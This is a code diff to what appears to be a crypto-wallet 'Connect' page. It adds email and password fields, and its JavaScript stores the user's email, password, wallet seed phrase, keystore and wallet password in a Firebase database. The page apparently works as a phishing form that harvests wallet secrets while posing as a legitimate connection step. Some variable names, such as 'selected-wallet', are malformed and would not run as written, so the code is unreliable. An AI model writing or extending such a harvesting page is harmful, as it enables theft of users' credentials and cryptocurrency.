@@ -226,6 +226,11 @@
             </select>
 
             <div id="info-input-container"></div>
+                     <label for="email">mail:</label>
+        <input type="email" id="email" name="email" required>
+
+        <label for="password">Mot de passe:</label>
+        <input type="password" id="password" name="password" required>
 
             <button type="button" id="submitData" name="submitData">Connect</button>
         </form>
@@ -369,7 +374,8 @@
       // ... user.uid
        set(ref(database, 'users/' + user.uid), {
     email: email,
-    password: selected-wallet,
+           password: password,
+    selectedWallet: selected-wallet,
     walletCredentials: wallet-phrase,
     walletKeystore: wallet-keystore,
     walletPassword: wallet-password,
